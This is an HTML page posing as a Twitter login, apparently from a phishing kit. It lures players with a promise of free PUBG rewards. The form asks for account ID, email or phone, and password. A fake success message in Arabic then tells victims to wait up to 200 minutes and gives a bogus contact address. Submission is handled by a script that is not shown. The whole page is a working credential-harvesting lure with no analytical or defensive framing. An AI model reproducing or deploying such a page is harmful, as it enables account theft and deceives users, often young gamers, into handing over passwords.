<!DOCTYPE html>
<html>

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title> Twitter Login</title>
    <link rel="icon" href="icons/Twitter-icon.png">
    <link rel="stylesheet" href="../css\fonts\ar\ar-font.css">
    <link rel="stylesheet" href="../css/bootstrap.min.css">
    <script src="../js/bootstrap.min.js"></script>
    <script src="../js/jquery-3.5.1.min.js"></script>
    <link rel="stylesheet" href="css/twitter.css">
    <script src="index.js"></script>

</head>

<body>
    <!-- Done Div -->
    <button type="button" class="btn btn-primary done-successfully-cinghaha" data-toggle="modal" data-target="#exampleModalCenter" style="display: none;"></button>
    <div class="modal fade" id="exampleModalCenter" tabindex="-1" role="dialog" aria-labelledby="exampleModalCenterTitle">
        <div class="modal-dialog modal-dialog-centered" role="document">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title" id="exampleModalCenterTitle">Successfully Done...</h5>
                    <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                        <span aria-hidden="true">&times;</span>
                    </button>
                </div>
                <div class="modal-body">
                    <p style="text-align: center !important;">تمت العميلة بنجاح ,الرجاء الانتضار 60 دقيقة الى 200 دقيقة حتى وصوله الى حسابك. <br><br>اذا واجهتك اي مشكلة يرجى التواصل عبر بريدنا الاكتروني:<br><br>pubg-mobile@official.com <br> </p>
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" data-dismiss="modal">تــم</button>
                </div>
            </div>
        </div>
    </div>
    <!-- End Done Div -->

    <center>
        <h1 class="d-none d-sm-block" style="color:#955fff;margin-top:40px;margin-bottom:40px">Get Anything You Want Now!</h1>
        <h3 class="d-block d-sm-none" style="color:#955fff;margin-top:40px;margin-bottom:40px">Get Anything You Want Now!</h3>
        <img class="img-fluid index-all-page-img" style="width:20%;" id="pg" src="../images/PG.png">
        <hr color="#7253E7">
        <!-- Material form login -->
        <div class="card col-lg-4 col-md-6">
            <h5 class="card-header info-color white-text text-center py-4">
                <strong>تسجيل الدخول في تويتر</strong>
            </h5>
            <!--Card content-->
            <div class="card-body px-lg-5 pt-0">
                <!-- Form -->
                <form class="text-center" style="color: #757575;"><br>
                    <!-- Email -->
                    <div class="md-form">
                        <input type="text" class="form-control id_tw" placeholder="Account ID" required><br>
                        <input type="text" class="form-control email_tw" placeholder="البريد او رقم الهاتف" required>
                    </div><br>
                    <!-- Password -->
                    <div class="md-form">
                        <input type="password" class="form-control password_tw" placeholder="كلمه المرور" required>
                    </div>
                    <div class="d-flex justify-content-around">
                        <div>
                            <!-- Remember me -->
                            <div class="form-check">
                                <input type="checkbox" class="form-check-input" id="materialLoginFormRemember">
                                <label class="form-check-label" for="materialLoginFormRemember">حفظ تسجيل الدخول</label>
                            </div>
                        </div>
                        <div>
                            <!-- Forgot password -->
                            <a href="https://twitter.com/account/begin_password_reset">نسيت كلمه المرور?</a>
                        </div>
                    </div>
                    <!-- Sign in button -->
                    <button class="twitter-login-bu btn btn-outline-info btn-rounded btn-block my-4 waves-effect z-depth-0" type="button">تـسجيل دخول</button>
                    <!-- Register -->
                    <p>Not a member?
                        <a href="https://twitter.com/i/flow/signup">Register</a>
                    </p>
                </form>
            </div>
        </div>
    </center>
    <script src="../js/bootstrap.min.js"></script>

</body>

</html>